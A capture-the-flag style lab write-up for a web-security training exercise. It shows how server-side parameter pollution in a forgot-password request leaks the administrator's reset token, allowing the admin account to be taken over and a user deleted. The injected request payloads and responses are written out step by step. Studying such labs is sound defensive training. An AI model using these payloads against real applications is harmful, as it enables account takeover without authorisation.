# Exploiting server-side parameter pollution in a query string

Concept: Recon the web-app find the parameter injection point and find the exploit

End Goal :  Delete user carlos by gaining admin privileges

Analysis :

- First of all we recon the whole web-app and find the parameter injection point.
- Let’s check the login requests and the forgot-password requests using burp.
- A forgot-password js file is found. The interesting part of that file is :
    
    ```jsx
    forgotPwdReady(() => {
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        const resetToken = urlParams.get('reset-token');
        if (resetToken)
        {
            window.location.href = `/forgot-password?reset_token=${resetToken}`;
        }
        else
        {
            const forgotPasswordBtn = document.getElementById("forgot-password-btn");
            forgotPasswordBtn.addEventListener("click", displayMsg);
        }
    });
    
    ```
    
- This confirms the presence of a query param **reset_token.**
- Let’s try out the request with a token first….
    
    ```
    https://0af4003504777837834528ce00e700c2.web-security-academy.net/forgot-password?reset_token=1234
    
    Response -> Invalid_token
    ```
    
- If we can get the reset_token for the admin, we can reset his password and login.
- let’s try out truncating the request body params in forgot-password request.
    
    ```
    POST /forgot-password HTTP/2
    Host: 0af4003504777837834528ce00e700c2.web-security-academy.net
    Cookie: session=hMl7HgbTlapaIG6QlXHBaAofa4SIs7dn
    
    csrf=jjkBCkSnqlTOFhOHebHeFxFxzEEMII3R&username=administrator%23
    ```
    
    - response
    
    ```json
    {"error": "Field not specified."}
    ```
    
- So, a field parameter is passed in the internal api request which is required.
    
    ```
    csrf=jjkBCkSnqlTOFhOHebHeFxFxzEEMII3R&username=administrator%26field=123
    
    Response --> Invalid field
    ```
    
- If we properly look at the response of the forgot password event which is
    
    ```json
    {"type":"email","result":"*****@normal-user.net"}
    ```
    
- It has a type which specifies the data sent. If we change the type to reset_token, we can get the token.
- Let’s check if the field parameter controls that.
    
    ```json
    csrf=jjkBCkSnqlTOFhOHebHeFxFxzEEMII3R&username=administrator%26field=reset_token
    ```
    
- And we are lucky to have guessed it right.
    
    ```json
    Response --> {"type":"reset_token","result":"plmp4rme4nusx4c8dzeigw28autmn0bi"}
    ```
    
- Now just send this request again with the correct reset_token
    
    ```
    https://0af4003504777837834528ce00e700c2.web-security-academy.net/forgot-password?reset_token=plmp4rme4nusx4c8dzeigw28autmn0bi
    ```
    
- Reset the password of the admin and login as admin and delete the user carlos from the admin panel.
- Lab Completed.